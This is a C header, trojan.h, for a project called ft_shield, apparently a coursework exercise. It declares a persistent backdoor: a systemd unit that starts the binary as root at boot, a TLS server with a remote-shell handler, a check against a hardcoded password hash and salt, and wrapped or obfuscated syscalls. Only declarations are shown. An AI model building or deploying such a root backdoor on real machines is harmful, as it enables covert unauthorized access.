#ifndef TROJAN_H
#define TROJAN_H

// grep -rnw /usr/include -e 'CLONE_SYSVSEM'
#define _GNU_SOURCE
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/file.h>
#include <pthread.h>
#include <sys/wait.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <sys/select.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <sys/mman.h>
/* #define _GNU_SOURCE
#include <sched.h>
#include <linux/sched.h>
*/
#include <sys/resource.h> 
#include <dlfcn.h>
#include <stdbool.h>
#include <errno.h>
#include <linux/prctl.h>

#define MAX_CLIENTS 3
#define sc(...) syscall(__VA_ARGS__)
#define CREATE_ARGS pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg
#define LOCK 1
#define UNLOCK 0
#define CREATE 1
#define DETACH 2
#define MLOCK 3
#define MUNLOCK 4

#ifndef HASHED_PWD
    #define HASHED_PWD "4ba117368c491a5d90b64fcccd7d2cedb31146545e87d659cbd0d5cacb3f3064"
#endif
#ifndef SALT
    #define SALT "4j9K2x7VzQmLp3Bt"
#endif

#define SYSTEMCTL_CONFIG \
"[Unit]\n" \
"Description=ft_shield start daemon\n" \
"After=local-fs.target\n\n" \
"[Service]\n" \
"Type=forking\n" \
"User=root\n" \
"Group=root\n" \
"ExecStart=/usr/bin/ft_shield\n" \
"UMask=007\n" \
"Restart=on-failure\n\n" \
"[Install]\n" \
"WantedBy=multi-user.target\n"

typedef struct s_args {
    int client_socket;
    SSL *ssl;
} t_args;


typedef int (*create_type)(CREATE_ARGS);
typedef int (*detach_type)(pthread_t id);
typedef int (*lock_type)(pthread_mutex_t * mutex);
typedef int (*unlock_type)(pthread_mutex_t *mutex);

SSL_CTX *create_context();

void handle_shell(SSL *ssl);
void configure_cert(SSL_CTX *ctx);
void ft_shutdown(t_args *args);
void create_daemon(void);
void handle_lock(int mod);
void read_event(char *event);
void get_plaintext(unsigned char *dest);

int p_create(CREATE_ARGS);
int p_detach(pthread_t id);
int m_lock(pthread_mutex_t mutex);
int m_unlock(pthread_mutex_t mutex);
void decode(int *data, char *decoded, int key, int n);

bool check_pwd(unsigned char *passwd, size_t passwd_len);

char *parse_device_name();

#endif
